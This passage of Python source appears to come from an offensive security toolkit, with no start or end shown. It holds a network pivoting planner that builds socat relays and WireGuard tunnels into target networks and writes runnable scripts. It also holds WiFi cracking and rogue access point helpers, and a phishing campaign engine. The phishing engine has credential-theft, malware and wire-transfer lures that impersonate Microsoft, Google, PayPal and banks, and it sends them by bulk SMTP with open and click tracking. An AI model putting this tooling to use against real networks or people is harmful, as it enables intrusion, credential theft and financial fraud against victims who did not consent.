                'transport': 'tcp',
                'title': 'Socat Dual-Ended Proxy',
                'description': 'socat listeners to relay arbitrary TCP services.',
                'risk': 'medium',
                'commands': [
                    "socat TCP-LISTEN:{listener_port},fork TCP:{target_gateway}:445"
                ],
                'cleanup': [
                    "pkill -f 'socat TCP-LISTEN:{listener_port}'"
                ],
                'detection': ['Look for socat binaries in process list'],
                'requirements': ['socat binary on pivot host'],
                'metrics': {'bandwidth': 'high', 'latency': 'medium', 'stealth': 'low'}
            },
            {
                'id': 'wireguard_site_to_site',
                'category': 'vpn',
                'transport': 'udp',
                'title': 'WireGuard Site-to-Site',
                'description': 'Persistent encrypted tunnel bridging networks.',
                'risk': 'critical',
                'commands': [
                    "wg genkey | tee client.key | wg pubkey > client.pub",
                    "wg genkey | tee server.key | wg pubkey > server.pub",
                    "cat <<'EOF' > /etc/wireguard/{wg_interface}.conf\n[Interface]\nAddress = 10.200.0.2/24\nPrivateKey = $(cat client.key)\nListenPort = 51820\n\n[Peer]\nPublicKey = $(cat server.pub)\nAllowedIPs = {target_network}\nEndpoint = {entry_host}:51820\nPersistentKeepalive = 25\nEOF",
                    "wg-quick up {wg_interface}"
                ],
                'cleanup': [
                    "wg-quick down {wg_interface}",
                    "rm -f /etc/wireguard/{wg_interface}.conf client.key client.pub server.key server.pub"
                ],
                'detection': ['Monitor WireGuard interface creations'],
                'requirements': ['Kernel WireGuard support', 'Root access'],
                'metrics': {'bandwidth': 'very_high', 'latency': 'low', 'stealth': 'medium'}
            }
        ]
        catalog = []
        for spec in specs:
            commands = [self._safe_command_template(cmd, params) for cmd in spec['commands']]
            cleanup = [self._safe_command_template(cmd, params) for cmd in spec['cleanup']]
            catalog.append(PivotTechnique(
                identifier=spec['id'],
                category=spec['category'],
                transport=spec['transport'],
                title=spec['title'],
                description=spec['description'],
                risk=spec['risk'],
                commands=commands,
                cleanup=cleanup,
                detection=spec['detection'],
                requirements=spec['requirements'],
                metrics=spec['metrics']
            ))
        return catalog

    def _score_pivot_technique(self, technique, profile):
        bandwidth_map = {'low': 0.4, 'balanced': 0.7, 'high': 0.9, 'very_high': 1.0}
        stealth_map = {'low': 0.4, 'medium': 0.7, 'high': 0.9}
        latency_map = {'high': 0.4, 'medium': 0.7, 'low': 0.95}
        bw = bandwidth_map.get(technique.metrics.get('bandwidth', 'balanced'), 0.7)
        st = stealth_map.get(technique.metrics.get('stealth', 'medium'), 0.7)
        lt = latency_map.get(technique.metrics.get('latency', 'medium'), 0.7)
        weight_bw = 0.5 if profile['bandwidth_preference'] == 'high' else 0.3
        weight_st = 0.4 if profile['stealth_mode'] else 0.2
        weight_lt = 0.3
        base = 0.3
        score = base + weight_bw * bw + weight_st * st + weight_lt * lt
        return round(score, 3)

    def _select_pivot_routes(self, profile, catalog):
        desired_methods = set(profile['methods'])
        desired_transports = set(profile['transports'])
        include_all_methods = not desired_methods or 'auto' in desired_methods or 'any' in desired_methods
        include_all_transports = not desired_transports or 'auto' in desired_transports or 'any' in desired_transports
        routes = []
        match_count = 0
        for technique in catalog:
            if not include_all_methods and technique.category not in desired_methods:
                continue
            if not include_all_transports and technique.transport not in desired_transports:
                continue
            match_count += 1
            score = self._score_pivot_technique(technique, profile)
            notes = f"Bandwidth: {technique.metrics.get('bandwidth', 'n/a')} | Latency: {technique.metrics.get('latency', 'n/a')}"
            routes.append(PivotRoute(
                name=technique.title,
                entry_host=profile['entry_host'],
                target_network=profile['target_network'],
                technique=technique,
                score=score,
                notes=notes
            ))
        truncated = False
        if len(routes) > profile['max_routes']:
            truncated = True
            routes = routes[:profile['max_routes']]
        return routes, truncated, match_count

    def _build_pivot_plan(self, profile):
        catalog = self._get_pivot_catalog(profile)
        routes, truncated, match_count = self._select_pivot_routes(profile, catalog)
        warnings = []
        errors = []
        if not routes:
            warnings.append('No pivot routes matched the provided filters; expand methods/transports or lower restrictions.')
        elif truncated:
            warnings.append('Route list truncated by max_routes limit.')
        plan = PivotPlan(
            session_id=profile['session_id'],
            target_network=profile['target_network'],
            entry_host=profile['entry_host'],
            methods_requested=profile['methods'],
            transports_requested=profile['transports'],
            routes=routes,
            warnings=warnings,
            errors=errors,
            generated_at=self._utc_timestamp()
        )
        if match_count and not routes:
            warnings.append('Candidate techniques existed but were filtered out by risk or max route constraints.')
        for route in routes:
            self._audit_pivot_route(profile, route)
        return plan

    def _display_pivot_plan(self, profile, plan):
        print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}PIVOT PLAN SUMMARY{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Session ID : {Fore.CYAN}{plan.session_id}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Entry Host : {Fore.CYAN}{plan.entry_host}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Target Net : {Fore.CYAN}{plan.target_network}{Style.RESET_ALL}")
        print(f"{Fore.WHITE} Routes : {Fore.CYAN}{len(plan.routes)}{Style.RESET_ALL}")
        if plan.warnings:
            print(f"{Fore.YELLOW}[!] Warnings: {len(plan.warnings)}{Style.RESET_ALL}")
        if plan.errors:
            print(f"{Fore.RED}[!] Errors: {len(plan.errors)}{Style.RESET_ALL}")
        for route in plan.routes:
            print(f"\n{Fore.GREEN}[+] {route.name}{Style.RESET_ALL} ({route.technique.category}/{route.technique.transport})")
            print(f" Score: {route.score} | {route.notes}")
            print(f" {route.technique.description}")
            for command in route.technique.commands[:3]:
                print(f" $ {command}")
            if route.technique.detection:
                print(f" Detection: {route.technique.detection[0]}")
            if route.technique.requirements:
                print(f" Req: {route.technique.requirements[0]}")

    def _export_pivot_plan(self, profile, plan):
        timestamp = int(time.time())
        base_name = f"pivot_plan_{plan.session_id}_{timestamp}"
        json_path = f"{base_name}.json"
        txt_path = f"{base_name}_report.txt"
        try:
            with open(json_path, 'w', encoding='utf-8') as fh:
                json.dump(plan.to_dict(), fh, indent=2)
            with open(txt_path, 'w', encoding='utf-8') as fh:
                fh.write("PIVOT PLAN REPORT\n")
                fh.write(f"Generated: {plan.generated_at}\n")
                fh.write(f"Session: {plan.session_id}\n")
                fh.write(f"Entry Host: {plan.entry_host}\n")
                fh.write(f"Target Network: {plan.target_network}\n")
                fh.write(f"Routes: {len(plan.routes)}\n\n")
                for route in plan.routes:
                    fh.write(f"[{route.technique.category}/{route.technique.transport}] {route.name}\n")
                    fh.write(f"Score: {route.score} | Notes: {route.notes}\n")
                    fh.write(f"Description: {route.technique.description}\n")
                    fh.write("Commands:\n")
                    for command in route.technique.commands:
                        fh.write(f" - {command}\n")
                    if route.technique.cleanup:
                        fh.write("Cleanup:\n")
                        for command in route.technique.cleanup:
                            fh.write(f" - {command}\n")
                    if route.technique.detection:
                        fh.write("Detection:\n")
                        for hint in route.technique.detection:
                            fh.write(f" - {hint}\n")
                    fh.write("\n")
                if plan.warnings:
                    fh.write("Warnings:\n")
                    for warning in plan.warnings:
                        fh.write(f"- {warning}\n")
        except OSError as exc:
            self.error_handler.handle_error(exc, "Exporting pivot plan")
            return []
        return [json_path, txt_path]

    def _generate_pivot_scripts(self, profile, plan):
        if not profile['generate_scripts'] or not plan.routes:
            return []
        base_dir = profile['script_dir'] or os.getcwd()
        try:
            os.makedirs(base_dir, exist_ok=True)
        except OSError as exc:
            self.error_handler.handle_error(exc, "Creating pivot script directory")
            return []
        timestamp = int(time.time())
        suffix = '.ps1' if profile['platform'] == 'windows' else '.sh'
        script_path = os.path.join(base_dir, f"pivot_{plan.session_id}_{timestamp}{suffix}")
        try:
            with open(script_path, 'w', encoding='utf-8') as fh:
                if suffix == '.sh':
                    fh.write('#!/bin/bash\nset -e\n')
                else:
                    fh.write('param()\n')
                for route in plan.routes:
                    fh.write(f"\n# {route.name}\n")
                    for command in route.technique.commands:
                        fh.write(f"{command}\n")
                    if route.technique.cleanup:
                        fh.write("# Cleanup\n")
                        for command in route.technique.cleanup:
                            fh.write(f"# {command}\n")
        except OSError as exc:
            self.error_handler.handle_error(exc, "Writing pivot script")
            return []
        if suffix == '.sh':
            try:
                os.chmod(script_path, 0o700)
            except OSError:
                pass
        return [script_path]

    def _audit_pivot_route(self, profile, route):
        audit_path = profile['audit_log']
        if not audit_path or audit_path.lower() in {'none', 'off'}:
            return
        entry = {
            'timestamp': self._utc_timestamp(),
            'session': profile['session_id'],
            'route': route.name,
            'technique': route.technique.identifier,
            'transport': route.technique.transport,
            'score': route.score
        }
        try:
            with open(audit_path, 'a', encoding='utf-8') as fh:
                fh.write(json.dumps(entry) + "\n")
        except OSError:
            pass

    def run_pivot(self):
        """Adaptive pivot planning and tunneling helper"""
        profile = self._resolve_pivot_profile()
        plan = self._build_pivot_plan(profile)
        self._display_pivot_plan(profile, plan)
        report_paths = self._export_pivot_plan(profile, plan)
        script_paths = self._generate_pivot_scripts(profile, plan)
        if report_paths:
            print(f"\n{Fore.GREEN}[+] Pivot plan reports saved:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")
        if script_paths:
            print(f"{Fore.GREEN}[+] Deployment scripts generated:{Style.RESET_ALL}")
            for path in script_paths:
                print(f" • {path}")
        if not plan.routes:
            print(f"{Fore.YELLOW}[!] No pivot routes available for provided filters.{Style.RESET_ALL}")
        return plan
    
    # ============ WIRELESS MODULES ============
    
    def run_wifi_scanner(self):
        """WiFi network scanner"""
        interface = self.module_options.get('interface', 'wlan0')
        channel = self.module_options.get('channel', 'all')
        
        print(f"{Fore.CYAN}[*] Scanning WiFi networks{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Interface: {interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Channel: {channel}{Style.RESET_ALL}\n")
        
        if not SCAPY_AVAILABLE:
            print(f"{Fore.RED}[!] Scapy not available. Install with: pip install scapy{Style.RESET_ALL}")
            return
        
        print(f"{Fore.YELLOW}[!] WiFi scanning requires monitor mode and root privileges{Style.RESET_ALL}")
        print(f"{Fore.BLUE}[*] Commands to enable monitor mode:{Style.RESET_ALL}")
        print(f"{Fore.CYAN} sudo ifconfig {interface} down{Style.RESET_ALL}")
        print(f"{Fore.CYAN} sudo iwconfig {interface} mode monitor{Style.RESET_ALL}")
        print(f"{Fore.CYAN} sudo ifconfig {interface} up{Style.RESET_ALL}")
        
        print(f"\n{Fore.GREEN}[*] WiFi scanner ready (requires root to capture){Style.RESET_ALL}")
    
    def run_wifi_cracker(self):
        """WPA/WPA2 handshake cracker"""
        handshake_file = self.module_options.get('handshake', 'capture.pcap')
        wordlist = self.module_options.get('wordlist', 'rockyou.txt')
        bssid = self.module_options.get('bssid', '00:11:22:33:44:55')
        
        print(f"{Fore.CYAN}[*] WPA/WPA2 handshake cracker{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Handshake: {handshake_file}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Wordlist: {wordlist}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] BSSID: {bssid}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}[*] Using aircrack-ng:{Style.RESET_ALL}")
        command = f"aircrack-ng -w {wordlist} -b {bssid} {handshake_file}"
        print(f"{Fore.CYAN}{command}{Style.RESET_ALL}")
        
        if os.path.exists(handshake_file) and os.path.exists(wordlist):
            print(f"\n{Fore.YELLOW}[*] Files found, attempting crack...{Style.RESET_ALL}")
            print(f"{Fore.RED}[!] This may take a long time depending on wordlist size{Style.RESET_ALL}")
        else:
            print(f"\n{Fore.RED}[!] Handshake or wordlist file not found{Style.RESET_ALL}")
    
    def run_rogue_ap(self):
        """Rogue access point creator"""
        interface = self.module_options.get('interface', 'wlan0')
        ssid = self.module_options.get('ssid', 'Free_WiFi')
        channel = self.module_options.get('channel', '6')
        
        print(f"{Fore.CYAN}[*] Creating rogue access point{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Interface: {interface}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] SSID: {ssid}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Channel: {channel}{Style.RESET_ALL}\n")
        
        print(f"{Fore.BLUE}[*] Using hostapd configuration:{Style.RESET_ALL}")
        hostapd_conf = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0"""
        
        print(f"{Fore.CYAN}{hostapd_conf}{Style.RESET_ALL}")
        print(f"\n{Fore.YELLOW}[*] Save config to hostapd.conf and run: hostapd hostapd.conf{Style.RESET_ALL}")
    
    # ============ SOCIAL ENGINEERING MODULES ============
    
    def run_phishing(self):
        """
        Advanced Phishing Campaign Manager 
        
        Features:
        - 20+ HTML email templates
        - Multi-threaded SMTP delivery
        - Email open & click tracking
        - Campaign analytics dashboard
        - SQLite database for results
        - Email validation & verification
        - Content personalization (variables)
        - Attachment support
        - Link shortening & tracking
        - Rate limiting & throttling
        - SPF/DKIM awareness
        - Bounce handling
        - Real-time statistics
        - Export reports (CSV/JSON/PDF)
        """
        profile = self._resolve_phishing_profile()
        
        if not profile:
            print(f"{Fore.RED}[] Failed to initialize phishing campaign{Style.RESET_ALL}")
            return
        
        # Display configuration
        self._display_phishing_config(profile)
        
        # Initialize campaign
        campaign = self._initialize_phishing_campaign(profile)
        
        if not campaign:
            print(f"{Fore.RED}[] Campaign initialization failed{Style.RESET_ALL}")
            return
        
        # Load and validate targets
        targets = self._load_phishing_targets(profile, campaign)
        
        if not targets:
            print(f"{Fore.RED}[] No valid targets loaded{Style.RESET_ALL}")
            return
        
        print(f"{Fore.GREEN}[] Loaded {len(targets)} valid targets{Style.RESET_ALL}")
        
        # Confirm execution
        if not profile['auto_execute']:
            confirm = input(f"\n{Fore.YELLOW}[?] Start campaign? (yes/no): {Style.RESET_ALL}")
            if confirm.lower() not in ['yes', 'y']:
                print(f"{Fore.YELLOW}[*] Campaign cancelled{Style.RESET_ALL}")
                return
        
        # Execute campaign
        print(f"\n{Fore.CYAN}[*] Starting phishing campaign...{Style.RESET_ALL}\n")
        results = self._execute_phishing_campaign(profile, campaign, targets)
        
        # Display results
        self._display_phishing_results(profile, campaign, results)
        
        # Export reports
        if profile['export_results']:
            report_paths = self._export_phishing_results(profile, campaign, results)
            print(f"\n{Fore.GREEN}[] Reports exported:{Style.RESET_ALL}")
            for path in report_paths:
                print(f" • {path}")
        
        print(f"\n{Fore.GREEN}[] Campaign completed{Style.RESET_ALL}")
    
    def _resolve_phishing_profile(self):
        """Build comprehensive phishing campaign configuration"""
        try:
            template = self.module_options.get('template', 'office365')
            targets_file = self.module_options.get('targets', 'emails.txt')
            smtp_server = self.module_options.get('smtp_server', 'smtp.gmail.com')
            smtp_port = int(self.module_options.get('smtp_port', '587'))
            smtp_user = self.module_options.get('smtp_user', '')
            smtp_pass = self.module_options.get('smtp_password', '')
            from_email = self.module_options.get('from_email', smtp_user)
            from_name = self.module_options.get('from_name', 'IT Support')
            reply_to = self.module_options.get('reply_to', from_email)
            
            # Campaign settings
            campaign_name = self.module_options.get('campaign_name', f'phishing_{int(time.time())}')
            subject = self.module_options.get('subject', '') # Auto from template if empty
            phish_url = self.module_options.get('phish_url', 'http://localhost:8080')
            
            # Advanced options
            use_tls = self.module_options.get('use_tls', 'true').lower() == 'true'
            use_ssl = self.module_options.get('use_ssl', 'false').lower() == 'true'
            track_opens = self.module_options.get('track_opens', 'true').lower() == 'true'
            track_clicks = self.module_options.get('track_clicks', 'true').lower() == 'true'
            personalize = self.module_options.get('personalize', 'true').lower() == 'true'
            validate_emails = self.module_options.get('validate_emails', 'true').lower() == 'true'
            
            # Performance settings
            threads = int(self.module_options.get('threads', '5'))
            rate_limit = int(self.module_options.get('rate_limit', '10')) # emails per minute
            delay_min = float(self.module_options.get('delay_min', '1'))
            delay_max = float(self.module_options.get('delay_max', '5'))
            
            # Attachment settings
            attachment = self.module_options.get('attachment', '')
            attachment_name = self.module_options.get('attachment_name', '')
            
            # Database
            db_file = self.module_options.get('db_file', f'{campaign_name}.db')
            
            # Export settings
            export_results = self.module_options.get('export_results', 'true').lower() == 'true'
            export_format = self.module_options.get('export_format', 'all') # csv, json, html, all
            
            # Auto execute (for testing)
            auto_execute = self.module_options.get('auto_execute', 'false').lower() == 'true'
            
            profile = {
                'template': template,
                'targets_file': targets_file,
                'smtp_server': smtp_server,
                'smtp_port': smtp_port,
                'smtp_user': smtp_user,
                'smtp_pass': smtp_pass,
                'from_email': from_email,
                'from_name': from_name,
                'reply_to': reply_to,
                'campaign_name': campaign_name,
                'subject': subject,
                'phish_url': phish_url,
                'use_tls': use_tls,
                'use_ssl': use_ssl,
                'track_opens': track_opens,
                'track_clicks': track_clicks,
                'personalize': personalize,
                'validate_emails': validate_emails,
                'threads': threads,
                'rate_limit': rate_limit,
                'delay_min': delay_min,
                'delay_max': delay_max,
                'attachment': attachment,
                'attachment_name': attachment_name,
                'db_file': db_file,
                'export_results': export_results,
                'export_format': export_format,
                'auto_execute': auto_execute
            }
            
            return profile
            
        except Exception as e:
            print(f"{Fore.RED}[] Profile error: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _get_phishing_templates(self):
        """Get comprehensive email templates library"""
        return {
            'office365': {
                'name': 'Microsoft Office 365',
                'subject': ' Password Expiration Notice',
                'preheader': 'Your password will expire in 24 hours',
                'logo': '',
                'color': '#0078D4',
                'category': 'credential_theft'
            },
            'google': {
                'name': 'Google Security Alert',
                'subject': '️ Unusual Sign-In Activity Detected',
                'preheader': 'We detected a new sign-in to your Google Account',
                'logo': '',
                'color': '#EA4335',
                'category': 'credential_theft'
            },
            'paypal': {
                'name': 'PayPal Security',
                'subject': '️ Unusual Activity on Your Account',
                'preheader': 'We noticed some unusual activity',
                'logo': '',
                'color': '#003087',
                'category': 'credential_theft'
            },
            'amazon': {
                'name': 'Amazon Account Alert',
                'subject': ' Order Confirmation Required',
                'preheader': 'Confirm your recent order #',
                'logo': '',
                'color': '#FF9900',
                'category': 'credential_theft'
            },
            'linkedin': {
                'name': 'LinkedIn Notification',
                'subject': ' You appeared in 12 searches this week',
                'preheader': 'See who viewed your profile',
                'logo': '',
                'color': '#0077B5',
                'category': 'credential_theft'
            },
            'facebook': {
                'name': 'Facebook Security',
                'subject': ' New Login from Unknown Device',
                'preheader': 'Was this you?',
                'logo': '',
                'color': '#1877F2',
                'category': 'credential_theft'
            },
            'apple': {
                'name': 'Apple ID',
                'subject': ' Your Apple ID Was Used to Sign In',
                'preheader': 'on a device near',
                'logo': '',
                'color': '#000000',
                'category': 'credential_theft'
            },
            'bank_generic': {
                'name': 'Banking Alert',
                'subject': ' Security Alert: Unusual Transaction',
                'preheader': 'Please verify your recent activity',
                'logo': '️',
                'color': '#003366',
                'category': 'credential_theft'
            },
            'dropbox': {
                'name': 'Dropbox',
                'subject': ' Shared Folder Access Request',
                'preheader': 'Someone shared a file with you',
                'logo': '',
                'color': '#0061FF',
                'category': 'malware'
            },
            'docusign': {
                'name': 'DocuSign',
                'subject': '️ Please Review and Sign Document',
                'preheader': 'Action required on your document',
                'logo': '',
                'color': '#FFB400',
                'category': 'malware'
            },
            'ups_shipping': {
                'name': 'UPS Tracking',
                'subject': ' UPS Package Delivery Attempt Failed',
                'preheader': 'Track your package',
                'logo': '',
                'color': '#351C15',
                'category': 'malware'
            },
            'fedex_shipping': {
                'name': 'FedEx',
                'subject': ' FedEx Shipment Notification',
                'preheader': 'Your package is on the way',
                'logo': '',
                'color': '#4D148C',
                'category': 'malware'
            },
            'zoom': {
                'name': 'Zoom',
                'subject': ' You Missed a Zoom Meeting',
                'preheader': 'Recording available',
                'logo': '',
                'color': '#2D8CFF',
                'category': 'credential_theft'
            },
            'slack': {
                'name': 'Slack',
                'subject': ' You Have New Direct Messages',
                'preheader': 'Check your unread messages',
                'logo': '',
                'color': '#611F69',
                'category': 'credential_theft'
            },
            'teams': {
                'name': 'Microsoft Teams',
                'subject': ' New Team Activity',
                'preheader': 'You were mentioned in a conversation',
                'logo': '',
                'color': '#6264A7',
                'category': 'credential_theft'
            },
            'hr_policy': {
                'name': 'HR Department',
                'subject': ' Mandatory: New Company Policy Acknowledgement',
                'preheader': 'Action required by end of week',
                'logo': '',
                'color': '#333333',
                'category': 'internal'
            },
            'it_support': {
                'name': 'IT Support',
                'subject': ' System Maintenance Scheduled',
                'preheader': 'Please backup your data',
                'logo': '',
                'color': '#0066CC',
                'category': 'internal'
            },
            'invoice': {
                'name': 'Accounting',
                'subject': ' Invoice #{{invoice_number}} - Payment Due',
                'preheader': 'Please remit payment',
                'logo': '',
                'color': '#006633',
                'category': 'bec'
            },
            'wire_transfer': {
                'name': 'Finance Department',
                'subject': ' URGENT: Wire Transfer Request',
                'preheader': 'CEO approval required',
                'logo': '',
                'color': '#CC0000',
                'category': 'bec'
            },
            'covid_test': {
                'name': 'Health Department',
                'subject': ' COVID-19 Test Results Available',
                'preheader': 'View your test results',
                'logo': '️',
                'color': '#009688',
                'category': 'social'
            }
        }
    
    def _display_phishing_config(self, profile):
        """Display phishing campaign configuration"""
        templates = self._get_phishing_templates()
        template_info = templates.get(profile['template'], {})
        
        print(f"{Fore.CYAN}╔══════════════════════════════════════════════════════════╗{Style.RESET_ALL}")
        print(f"{Fore.CYAN}║ ADVANCED PHISHING CAMPAIGN MANAGER v3.0 ║{Style.RESET_ALL}")
        print(f"{Fore.CYAN}╚══════════════════════════════════════════════════════════╝{Style.RESET_ALL}\n")
        
        print(f"{Fore.YELLOW}[] Campaign Configuration:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
        print(f" {Fore.CYAN}Campaign:{Style.RESET_ALL} {profile['campaign_name']}")
        print(f" {Fore.CYAN}Template:{Style.RESET_ALL} {template_info.get('logo', '•')} {template_info.get('name', profile['template'])}")
        print(f" {Fore.CYAN}Targets File:{Style.RESET_ALL} {profile['targets_file']}")
        print(f" {Fore.CYAN}Phishing URL:{Style.RESET_ALL} {profile['phish_url']}")
        
        print(f"\n{Fore.YELLOW}[] SMTP Configuration:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
        print(f" {Fore.CYAN}Server:{Style.RESET_ALL} {profile['smtp_server']}:{profile['smtp_port']}")
        print(f" {Fore.CYAN}From:{Style.RESET_ALL} {profile['from_name']} <{profile['from_email']}>")
        print(f" {Fore.CYAN}Auth:{Style.RESET_ALL} {'' if profile['smtp_user'] else ''} {'TLS' if profile['use_tls'] else 'SSL' if profile['use_ssl'] else 'None'}")
        
        print(f"\n{Fore.YELLOW}[️] Features:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
        features = []
        if profile['track_opens']:
            features.append('Open Tracking')
        if profile['track_clicks']:
            features.append('Click Tracking')
        if profile['personalize']:
            features.append('Personalization')
        if profile['validate_emails']:
            features.append('Email Validation')
        if profile['attachment']:
            features.append(f"Attachment: {profile['attachment_name'] or os.path.basename(profile['attachment'])}")
        
        for feature in features:
            print(f" {Fore.GREEN}{Style.RESET_ALL} {feature}")
        
        print(f"\n{Fore.YELLOW}[] Performance:{Style.RESET_ALL}")
        print(f"{Fore.WHITE}{'─' * 60}{Style.RESET_ALL}")
        print(f" {Fore.CYAN}Threads:{Style.RESET_ALL} {profile['threads']}")
        print(f" {Fore.CYAN}Rate Limit:{Style.RESET_ALL} {profile['rate_limit']} emails/minute")
        print(f" {Fore.CYAN}Delay:{Style.RESET_ALL} {profile['delay_min']}-{profile['delay_max']}s per email")
        
        print(f"\n{Fore.YELLOW}[️] WARNING:{Style.RESET_ALL} {Fore.RED}Authorized testing only!{Style.RESET_ALL}\n")
    
    def _initialize_phishing_campaign(self, profile):
        """Initialize campaign data structures and database"""
        try:
            import sqlite3
            
            # Create database
            conn = sqlite3.connect(profile['db_file'])
            cursor = conn.cursor()
            
            # Create campaigns table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS campaigns (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT UNIQUE NOT NULL,
                    template TEXT NOT NULL,
                    phish_url TEXT,
                    created_at INTEGER NOT NULL,
                    started_at INTEGER,
                    completed_at INTEGER,
                    status TEXT DEFAULT 'created',
                    total_targets INTEGER DEFAULT 0,
                    emails_sent INTEGER DEFAULT 0,
                    emails_failed INTEGER DEFAULT 0,
                    opens INTEGER DEFAULT 0,
                    clicks INTEGER DEFAULT 0
                )
            ''')
            
            # Create targets table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS targets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id INTEGER NOT NULL,
                    email TEXT NOT NULL,
                    first_name TEXT,
                    last_name TEXT,
                    company TEXT,
                    position TEXT,
                    custom_data TEXT,
                    status TEXT DEFAULT 'pending',
                    sent_at INTEGER,
                    opened_at INTEGER,
                    clicked_at INTEGER,
                    ip_address TEXT,
                    user_agent TEXT,
                    error_message TEXT,
                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id)
                )
            ''')
            
            # Create tracking table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS tracking (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    campaign_id INTEGER NOT NULL,
                    target_id INTEGER NOT NULL,
                    event_type TEXT NOT NULL,
                    timestamp INTEGER NOT NULL,
                    ip_address TEXT,
                    user_agent TEXT,
                    details TEXT,
                    FOREIGN KEY (campaign_id) REFERENCES campaigns(id),
                    FOREIGN KEY (target_id) REFERENCES targets(id)
                )
            ''')
            
            # Insert campaign record
            cursor.execute('''
                INSERT INTO campaigns (name, template, phish_url, created_at, status)
                VALUES (?, ?, ?, ?, 'created')
            ''', (profile['campaign_name'], profile['template'], profile['phish_url'], int(time.time())))
            
            campaign_id = cursor.lastrowid
            
            conn.commit()
            conn.close()
            
            # Return campaign object
            campaign = {
                'id': campaign_id,
                'name': profile['campaign_name'],
                'db_file': profile['db_file'],
                'start_time': time.time(),
                'stats': {
                    'sent': 0,
                    'failed': 0,
                    'opens': 0,
                    'clicks': 0
                }
            }
            
            print(f"{Fore.GREEN}[] Campaign initialized: {campaign['name']} (ID: {campaign['id']}){Style.RESET_ALL}")
            return campaign
            
        except Exception as e:
            print(f"{Fore.RED}[] Campaign init error: {str(e)}{Style.RESET_ALL}")
            return None
    
    def _load_phishing_targets(self, profile, campaign):
        """Load and validate email targets"""
        targets = []
        
        if not os.path.exists(profile['targets_file']):
            print(f"{Fore.RED}[] Targets file not found: {profile['targets_file']}{Style.RESET_ALL}")
            return []
        
        try:
            import re
            import sqlite3
            
            email_regex = re.compile(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$')
            
            print(f"{Fore.CYAN}[*] Loading targets from: {profile['targets_file']}{Style.RESET_ALL}")
            
            with open(profile['targets_file'], 'r', encoding='utf-8') as f:
                lines = f.readlines()
            
            conn = sqlite3.connect(profile['db_file'])
            cursor = conn.cursor()
            
            for line in lines:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                # Support CSV format: email,first_name,last_name,company,position
                parts = [p.strip() for p in line.split(',')]
                email = parts[0].lower()
                
                # Validate email
                if profile['validate_emails'] and not email_regex.match(email):
                    print(f"{Fore.YELLOW}[!] Invalid email skipped: {email}{Style.RESET_ALL}")
                    continue
                
                # Parse additional fields
                first_name = parts[1] if len(parts) > 1 else ''
                last_name = parts[2] if len(parts) > 2 else ''
                company = parts[3] if len(parts) > 3 else ''
                position = parts[4] if len(parts) > 4 else ''
                
                # Generate tracking ID
                import hashlib
                tracking_id = hashlib.md5(f"{campaign['id']}:{email}:{time.time()}".encode()).hexdigest()
                
                # Insert into database
                cursor.execute('''
                    INSERT INTO targets (campaign_id, email, first_name, last_name, company, position, status)
                    VALUES (?, ?, ?, ?, ?, ?, 'pending')
                ''', (campaign['id'], email, first_name, last_name, company, position))
                
                target_id = cursor.lastrowid
                
                target = {
                    'id': target_id,
                    'email': email,
                    'first_name': first_name,
                    'last_name': last_name,
                    'company': company,
                    'position': position,
                    'tracking_id': tracking_id
                }
                
                targets.append(target)
            
            # Update campaign
            cursor.execute('''
                UPDATE campaigns SET total_targets = ? WHERE id = ?
            ''', (len(targets), campaign['id']))
            
            conn.commit()
            conn.close()
            
            return targets
            
        except Exception as e:
            print(f"{Fore.RED}[] Target loading error: {str(e)}{Style.RESET_ALL}")
            import traceback
            traceback.print_exc()
            return []
    
    def _execute_phishing_campaign(self, profile, campaign, targets):
        """Execute phishing campaign with multi-threading"""
        import threading
        import queue
        import sqlite3
        from email.mime.text import MIMEText
        from email.mime.multipart import MIMEMultipart
        from email.mime.base import MIMEBase
        from email import encoders
        import smtplib
        
        # Update campaign status
        conn = sqlite3.connect(profile['db_file'])
        cursor = conn.cursor()
        cursor.execute('UPDATE campaigns SET status = ?, started_at = ? WHERE id = ?',
                      ('running', int(time.time()), campaign['id']))
        conn.commit()
        conn.close()
        
        # Thread-safe queue and counters
        target_queue = queue.Queue()
        results_lock = threading.Lock()
        results = {
            'sent': 0,
            'failed': 0,
            'errors': []
        }
        
        # Rate limiter
        rate_limiter = threading.Semaphore(profile['rate_limit'])
        
        # Add targets to queue
        for target in targets:
            target_queue.put(target)
        
        # Worker function
        def email_worker():
            while True:
                try:
                    target = target_queue.get(timeout=1)
                except queue.Empty:
                    break
                
                try:
                    # Rate limiting
                    rate_limiter.acquire()
                    time.sleep(random.uniform(profile['delay_min'], profile['delay_max']))
                    
                    # Generate personalized email
                    email_content = self._generate_phishing_email(profile, campaign, target)
                    
                    # Send email
                    success = self._send_phishing_email(profile, target, email_content)
                    
                    # Update results
                    with results_lock:
                        if success:
                            results['sent'] += 1
